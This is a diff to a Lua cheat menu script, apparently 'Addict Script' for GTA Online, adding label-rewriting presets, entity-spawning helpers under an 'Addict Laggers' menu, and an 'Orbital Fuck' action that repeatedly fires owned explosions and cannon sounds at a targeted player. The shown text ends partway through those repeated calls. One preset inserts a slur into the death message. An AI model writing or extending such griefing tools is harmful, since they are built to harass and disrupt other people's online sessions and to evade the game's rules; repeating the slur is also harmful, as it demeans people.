@@ -29,7 +29,7 @@ async_http.dispatch()
 repeat util.yield()
 until response 
 
-local local_menu_version = "1.0.6"
+local local_menu_version = "1.0.7"
 
 if not dev_mode then
     async_http.init("raw.githubusercontent.com","/Addict0919/Addict-Script/main/AddictScript/AddictScriptVersion.lua",function(b)
@@ -4313,6 +4313,16 @@ for pids = 0, 31 do
     end
 end
 
+local Player_List = menu.ref_by_path("Players")
+function do_label_preset(label, text)
+    util.log("Set label " .. label .. " > " .. text)
+    menu.trigger_commands("addlabel " .. label)
+    local prep = "edit" .. string.gsub(label, "_", "") .. " " .. text
+    menu.trigger_commands(prep)
+    menu.trigger_command(Player_List)
+    --util.toast("Label set!")
+end
+
 Net_Shit = menu.list(menu.my_root(), "Net Shit", {"netshit"}, "", function(); end)
 
 menu.action(Net_Shit, "Tp Casino", {"tpincasino"}, "Faster alternative way of teleporting into the casino.", function(on_toggle)
@@ -4330,6 +4340,111 @@ menu.action(Net_Shit, "Fix Casino Heist", {}, "If you've bricked your casino hei
 	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_ACCESSPOINTS"), 0, true)
 end)
 
+
+
+labelpresets = menu.list(Net_Shit, "Label Presets", {"addictlabelpresets"}, "", function(); end)
+
+menu.toggle(labelpresets, "Auto Label Setter", {"autolabel"}, "Auto set all the labels everytime you join a new session. Save this turned 'On' your profile to keep set.", function(state)
+    if state then
+        players.on_join(function(player_id)
+            local my_player_id <const> = players.user()
+            if player_id == my_player_id then
+                wait_session_transition()
+                menu.trigger_commands("joinlabel")
+                util.yield(100)
+                menu.trigger_commands("initiallabel")
+                util.yield(100)
+                menu.trigger_commands("loadlabel")
+                util.yield(100)
+                menu.trigger_commands("onlinelabel")
+                util.yield(100)
+                menu.trigger_commands("diedlabel")
+                util.yield(100)
+                menu.trigger_commands("dippedlabel")
+                util.yield(100)
+                menu.trigger_commands("bannedlabel")
+                util.yield(100)--
+                menu.trigger_commands("joinlabel")
+                util.yield(100)
+                menu.trigger_commands("initiallabel")
+                util.yield(100)
+                menu.trigger_commands("loadlabel")
+                util.yield(100)
+                menu.trigger_commands("onlinelabel")
+                util.yield(100)
+                menu.trigger_commands("diedlabel")
+                util.yield(100)
+                menu.trigger_commands("dippedlabel")
+                util.yield(100)
+                menu.trigger_commands("bannedlabel")
+            end
+        end)
+    end
+end)
+
+menu.toggle(labelpresets, "Joining GTA Online with Addict Script", {"joinlabel"}, "Usually says: \"Joining GTA online\"", function(on_toggle)
+    if on_toggle then
+        do_label_preset("HUD_JOINING", "Joining GTA Online With Addict Script!")
+    else
+        --
+    end
+end)
+
+menu.toggle(labelpresets, "Initializing fuck all really...", {"initiallabel"}, "Usually says: \"Initializing\"", function(on_toggle)
+    if on_toggle then
+        do_label_preset("FMMC_PLYLOAD", "Initializing fuck all really...")
+    else
+        --
+    end
+end)
+
+menu.toggle(labelpresets, "Taking forever to load... AUUUUUGH!", {"loadlabel"}, "Usually says: \"Loading\"", function(on_toggle)
+    if on_toggle then
+        do_label_preset("MP_SPINLOADING", "Taking forever to load... AUUUUUGH!")
+    else
+        --
+    end
+end)
+
+menu.toggle(labelpresets, "Addict Online", {"onlinelabel"}, "Usually says: \"GTA online\"", function(on_toggle)
+    if on_toggle then
+        do_label_preset("HUD_LBD_FMF", "Addict Online (Invite, ~1~)")
+        do_label_preset("HUD_LBD_FMP", "Addict Online (Public, ~1~)")
+        do_label_preset("HUD_LBD_FMS", "Addict Online (Solo, ~1~)")
+        do_label_preset("HUD_LBD_FMF", "Addict Online (Friend, ~1~)")
+        do_label_preset("PM_SCR_MIS", "Addict Online")
+        do_label_preset("PCARD_ONLINE_OTHER", "Addict Online")
+        do_label_preset("ONLINE_BUILD", "Addict Online")
+        do_label_preset("LOADING_MPLAYER", "Addict Online")
+    else
+        --
+    end
+end)
+
+menu.toggle(labelpresets, "Retard fucking died", {"diedlabel"}, "Usually says: \"-playername- died.\"", function(on_toggle)
+    if on_toggle then
+        do_label_preset("TICK_DIED", "~a~~HUD_COLOUR_WHITE~ fucking died.")
+    else
+        --
+    end
+end)
+
+menu.toggle(labelpresets, "Player dipped", {"dippedlabel"}, "Usually says: \"-playername- left.\"", function(on_toggle)
+    if on_toggle then
+        do_label_preset("TICK_LEFT", "~a~~HUD_COLOUR_WHITE~ dipped.")
+    else
+        --
+    end
+end)
+
+menu.toggle(labelpresets, "You finally got banned. Oh well.", {"bannedlabel"}, "Usually says: \"You have been banned from Grand Theft Auto Online.\" Hopefully you never see this one.", function(on_toggle)
+    if on_toggle then
+        do_label_preset("HUD_ROSBANNED", "You finally got banned. Oh well.")
+        do_label_preset("HUD_ROSBANPERM", "You finally got banned. Oh well.")
+    else
+        --
+    end
+end)
 
 spams = menu.list(Net_Shit, "Chat Spammers", {}, "", function(); end)
 menu.divider(spams, "Chat Spammers")
@@ -11525,6 +11640,73 @@ end
         end)
 
     menu.divider(lagwiths, "Addict Laggers")
+
+    
+function give_object1(pid, hash)
+    request_model_load(hash)
+    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 10.0)
+    local object1 = entities.create_object(hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
+end
+
+function give_vehicle1(pid, hash)
+    request_model_load(hash)
+    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 10.0)
+    local car1 = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
+end
+
+function give_ped1(pid, hash)
+    request_model_load(hash)
+    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 65.5, 200.0)
+    local ped1 = entities.create_ped(1, hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
+end
+
+function give_object2(pid, hash)
+    request_model_load(hash)
+    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 0.0, 1.9)
+    local object1 = entities.create_object(hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
+end
+
+function give_ped2(pid, hash)
+    request_model_load(hash)
+    local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 0.0, 20.5)
+    local ped1 = entities.create_ped(1, hash, c, ENTITY.GET_ENTITY_HEADING(plyr))
+end
+
+function DRAW_LOCKON_SPRITE_ON_PLAYER(pid, color)
+	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+	local mpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
+	local dist = vect.dist(pos, mpos)
+	local max = 2000.0
+	local delta = max - dist
+	local mult = delta / max
+
+	if dist > max then 
+		mult = 0.0
+	end
+
+	if mult > 1.0 then
+		mult = 1.0
+	end
+
+	local ptrx, ptry = memory.alloc(), memory.alloc()
+	color = color or {['r'] = 255, ['g'] = 0, ['b'] = 0}
+	
+	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
+	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") do
+		wait()
+	end
+	
+	--GRAPHICS.SET_DRAW_ORIGIN(pos.x, pos.y, pos.z, 0)
+	GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(pos.x, pos.y, pos.z, ptrx, ptry)
+	local posx = memory.read_float(ptrx); memory.free(ptrx)
+	local posy = memory.read_float(ptry); memory.free(ptry)
+	GRAPHICS.DRAW_SPRITE("helicopterhud", "hud_outline", posx, posy, mult * 0.03 * 1.5, mult * 0.03 * 2.6, 90.0, color.r, color.g, color.b, 255, true)
+end
     
     menu.action(lagwiths, "Nuke V1", {"nuke"}, "Nuke the player", function()
         menu.trigger_commands("levitate")
@@ -11839,6 +12021,2108 @@ end
             ct = ct + 1
         end
     end)
+
+    
+menu.action(lagwiths, "Orbital Fuck", {"orbitalfuck"}, "Be careful...", function(on)
+    local countdown = 4.50	
+    menu.trigger_commands("tpcayoperico")
+    if players.is_in_interior(pid) then
+        return notification('The player is in interior', red)
+    end
+    local cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", false)
+    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+    local height = pos.z + 200
+    menu.trigger_commands('becomeorbitalcannon on')
+    CAM.DO_SCREEN_FADE_OUT(500)
+    util.yield(1000)
+    CAM.SET_CAM_ROT(cam, -90, 0.0, 0.0, 2)
+    CAM.SET_CAM_FOV(cam, 80)
+    CAM.SET_CAM_COORD(cam, pos.x, pos.y, height)
+    CAM.SET_CAM_ACTIVE(cam, true)
+    CAM.RENDER_SCRIPT_CAMS(true, false, 3000, true, false, 0)
+    STREAMING.SET_FOCUS_POS_AND_VEL(pos.x, pos.y, pos.z, 5.0, 0.0, 0.0)
+    GRAPHICS.SET_SCRIPT_GFX_DRAW_ORDER(1)
+    GRAPHICS.SET_DRAW_ORIGIN(pos.x, pos.y, pos.z, 0)
+    GRAPHICS.ANIMPOSTFX_PLAY('MP_OrbitalCannon', 0, true)
+    util.yield(1000)
+    CAM.DO_SCREEN_FADE_IN(0)
+
+    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('ORBITAL_CANNON_CAM')
+    while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
+        util.yield()
+    end
+    
+    local startTime = os.time()
+
+    while true do
+        util.yield()
+        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+        DRAW_LOCKON_SPRITE_ON_PLAYER(pid)
+
+        CAM.SET_CAM_COORD(cam, pos.x, pos.y, height)
+        HUD.DISPLAY_RADAR(false)
+
+        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_STATE')
+        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(3)
+        GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
+
+        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_ZOOM_LEVEL')
+        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(1.0)
+        GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
+
+        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_CHARGING_LEVEL')
+        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(1.0)
+        GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
+        
+        if countdown > 0 then
+            if os.difftime(os.time(), startTime) == 1 then
+                countdown = countdown - 1
+                startTime = os.time()
+            end
+            GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_COUNTDOWN')
+            GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(countdown)
+            GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
+        else
+            GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, 'SET_CHARGING_LEVEL')
+            GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.0)
+            GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
+
+            local effect = {['asset'] = 'scr_xm_orbital', ['name'] = 'scr_xm_orbital_blast'}
+    
+            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
+            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) do
+                util.yield()
+            end
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
